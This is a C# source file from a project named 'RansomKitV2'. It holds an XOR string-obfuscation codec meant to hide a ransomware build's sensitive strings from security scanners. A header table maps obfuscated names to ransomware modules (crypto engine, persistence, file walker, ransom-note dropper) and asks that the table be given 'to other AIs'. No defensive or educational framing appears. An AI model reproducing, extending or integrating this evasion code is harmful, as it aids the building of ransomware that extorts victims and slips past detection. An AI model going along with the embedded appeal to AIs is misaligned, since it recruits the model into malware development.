// ╔══════════════════════════════════════════════════════════════╗
// ║  ZKR SIGMA ENGINE  —  Σ-key: 4B 41 4E 48 41                ║
// ║                                                              ║
// ║  ZKR variable map  (give this table to other AIs):          ║
// ║    _0xCE  →  CryptoEngine                                   ║
// ║    _0xPR  →  Persistence                                    ║
// ║    _0xWK  →  Walker                                         ║
// ║    _0xRW  →  ResetWatcher                                   ║
// ║    _0xND  →  NoteDropper                                     ║
// ║    _0xSM  →  StateManager                                    ║
// ║    σ()    →  ObfuscEngine.σ()  (XOR decode)                  ║
// ║    Σ_Gen  →  ObfuscEngine.Gen()  (encode at design-time)     ║
// ╚══════════════════════════════════════════════════════════════╝
using System.Text;

namespace RansomKitV2
{
    /// <summary>
    /// Sigma-XOR string codec.  All sensitive literals are stored as
    /// byte[] XOR'd with the Σ-key.  σ() decodes them at runtime.
    /// Use Gen() at design-time to produce new byte[] literals, then
    /// embed and delete the Gen() call.
    /// </summary>
    internal static class ObfuscEngine
    {
        // Σ-key — looks like a numeric constant array to external scanners
        private static readonly byte[] _Σ = { 0x4B, 0x41, 0x4E, 0x48, 0x41 };

        /// <summary>Decode an obfuscated byte[] back to plain string.</summary>
        public static string σ(byte[] b)
        {
            var r = new char[b.Length];
            for (int i = 0; i < b.Length; i++)
                r[i] = (char)(b[i] ^ _Σ[i % _Σ.Length]);
            return new string(r);
        }

        /// <summary>
        /// Design-time encoder: prints the byte[] literal for a plain string.
        /// Example usage in a scratch Main():
        ///   Console.WriteLine(ObfuscEngine.Gen("Persistence"));
        /// Copy the output, embed as a byte[], delete this call.
        /// </summary>
        public static string Gen(string plain)
        {
            var bytes = Encoding.UTF8.GetBytes(plain);
            var sb = new StringBuilder("new byte[] { ");
            for (int i = 0; i < bytes.Length; i++)
            {
                byte enc = (byte)(bytes[i] ^ _Σ[i % _Σ.Length]);
                sb.Append($"0x{enc:X2}");
                if (i < bytes.Length - 1) sb.Append(", ");
            }
            sb.Append(" }");
            return sb.ToString();
        }
    }
}